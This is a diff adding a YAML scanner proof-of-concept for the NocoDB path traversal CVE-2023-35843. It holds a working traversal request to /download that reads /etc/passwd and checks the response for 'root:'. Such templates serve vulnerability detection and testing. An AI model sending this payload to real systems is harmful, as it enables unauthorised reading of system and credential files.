@@ -1,0 +1,16 @@
+id: poc-yaml-nocodb-path-traversal
+info:
+  name: NocoDB 路径遍历漏洞(CVE-2023-35843)
+  severity: high
+  tags:
+  - 两高一弱
+  - 目录遍历
+  - CVE-2023-35843
+  finger: NocoDB
+requests:
+- method: GET
+  path: /download/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+  expression: status_code == 200 && contains(body,"/bin") && contains(body,"root:")
+    && !contains(body,"<")
+variables: {}
+transport: http
